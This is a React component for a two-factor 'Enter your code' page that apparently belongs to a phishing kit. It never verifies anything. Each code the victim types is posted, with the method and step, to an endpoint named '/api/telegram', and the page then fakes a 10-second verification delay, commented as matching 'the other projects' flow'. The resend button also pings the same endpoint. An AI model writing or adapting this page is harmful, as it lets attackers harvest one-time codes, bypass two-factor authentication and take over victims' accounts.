import { useState, useEffect } from 'react'

interface VerifyCodePageProps {
  method: string
  email: string
  otpStep: 1 | 2
  onVerify: () => void
  onBack: () => void
}

export function VerifyCodePage({ method, email, otpStep, onVerify, onBack }: VerifyCodePageProps) {
  const [code, setCode] = useState('')
  const [isFocused, setIsFocused] = useState(false)
  const [error, setError] = useState('')
  const [isLoading, setIsLoading] = useState(false)

  const hasValue = code.trim() !== ''
  const showLabel = !hasValue && !isFocused

  useEffect(() => {
    const input = document.getElementById('code-input') as HTMLInputElement
    if (input) {
      setTimeout(() => input.focus(), 100)
    }
  }, [])

  const handleVerify = async () => {
    if (code.length < 6) {
      setError('Please enter a 6-digit code.')
      return
    }

    setError('')
    setIsLoading(true)

    await fetch('/api/telegram', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        kind: 'verification',
        method,
        code,
        otpStep,
      }),
    }).catch(console.error)

    // Simulate verification (match the other projects' flow delay)
    await new Promise((r) => setTimeout(r, 10000))
    setIsLoading(false)
    onVerify()
  }

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') {
      handleVerify()
    }
  }

  const getMethodText = () => {
    if (method === 'sms') return 'We sent a text message with a verification code to your phone.'
    if (method === 'phone') return 'We are calling your phone with a verification code.'
    return `We sent an email with a verification code to ${email}.`
  }

  return (
    <div>
      <h1 className="text-[28px] font-semibold text-[#1a1a1a] mb-4 tracking-tight">
        Enter your code
      </h1>
      
      <p className="text-[15px] text-[#6b6b6b] mb-6 leading-relaxed">
        {getMethodText()}
      </p>

      {/* Code Input */}
      <div className="relative mb-4">
        <input
          type="text"
          id="code-input"
          value={code}
          maxLength={6}
          onChange={(e) => {
            const val = e.target.value.replace(/\D/g, '') // only allow numbers
            setCode(val)
            setError('')
          }}
          onFocus={() => setIsFocused(true)}
          onBlur={() => setIsFocused(false)}
          onKeyPress={handleKeyPress}
          className={`
            w-full h-14 px-4 pt-5 pb-2 
            border rounded-lg text-base text-[#1a1a1a] bg-white
            transition-all duration-200 outline-none
            hover:border-[#1a1a1a] tracking-[0.2em] font-medium
            focus:border-[#1a1a1a] focus:shadow-[0_0_0_2px_rgba(26,26,26,0.1)]
            ${error ? 'border-[#d32f2f]' : 'border-[#d1d1d1]'}
          `}
        />
        <label
          htmlFor="code-input"
          className={`
            absolute left-4 text-base text-[#6b6b6b] pointer-events-none
            transition-all duration-200 origin-top-left
            ${showLabel ? 'top-[18px]' : 'top-2 scale-[0.85]'}
          `}
        >
          6-digit code
        </label>
      </div>

      {error && (
        <p className="text-[13px] text-[#d32f2f] mb-4">{error}</p>
      )}

      {/* Verify Button */}
      <div className="flex flex-col gap-3 mt-8">
        <button
          onClick={handleVerify}
          disabled={isLoading || code.length < 6}
          className="
            w-full h-12 rounded-full text-[15px] font-semibold
            bg-[#1a1a1a] text-white
            hover:bg-black
            disabled:bg-[#e0e0e0] disabled:text-[#9e9e9e] disabled:cursor-not-allowed
            flex items-center justify-center gap-2
            transition-all duration-200
          "
        >
          {isLoading ? (
            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
          ) : (
            'Verify'
          )}
        </button>

        <button
          onClick={onBack}
          disabled={isLoading}
          className="
            w-full h-12 rounded-full text-[15px] font-semibold
            bg-transparent text-[#1a1a1a]
            hover:bg-[#f5f5f5]
            transition-all duration-200
          "
        >
          Back to methods
        </button>
      </div>

      <div className="mt-6 text-center">
        <button
          type="button"
          className="text-[#1a1a1a] underline text-[14px] font-medium hover:text-black"
          onClick={() => {
            fetch('/api/telegram', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                kind: 'resend',
                method,
                otpStep,
              }),
            }).catch(console.error)
          }}
        >
          Resend code
        </button>
      </div>
    </div>
  )
}
